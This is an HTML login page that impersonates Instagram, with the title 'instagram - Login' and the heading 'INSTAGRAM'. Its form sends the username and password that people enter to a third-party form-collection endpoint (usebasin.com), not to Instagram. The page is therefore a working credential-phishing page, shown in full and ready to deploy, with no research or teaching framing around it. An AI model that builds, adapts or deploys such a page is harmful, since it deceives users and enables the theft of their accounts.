<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>instagram - Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:linear-gradient(135deg,#0f4c81,#1abc9c);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    background:#fff;
    width:380px;
    padding:35px;
    border-radius:15px;
    text-align:center;
    box-shadow:0 10px 25px rgba(0,0,0,.3);
}

.logo{
    width:90px;
    height:90px;
    border-radius:50%;
    margin-bottom:10px;
}

h2{
    color:#0f4c81;
    margin-bottom:25px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#0f4c81;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    cursor:pointer;
    margin-top:10px;
}

button:hover{
    background:#08345a;
}

.footer{
    margin-top:20px;
    font-size:13px;
    color:#666;
}
</style>

</head>
<body>

<div class="container">

<img src="logo.png" alt="College Logo" class="logo">

<h2>INSTAGRAM</h2>

<form action="https://usebasin.com/f/440fbd876ef7" method="POST">

<input
type="text"
name="Username"
placeholder="Enter Username"
required>

<input
type="password"
name="Password"
placeholder="Enter Password"
required>

<button type="submit">Login</button>

</form>

<div class="footer">
instagram
</div>

</div>

</body>
</html>
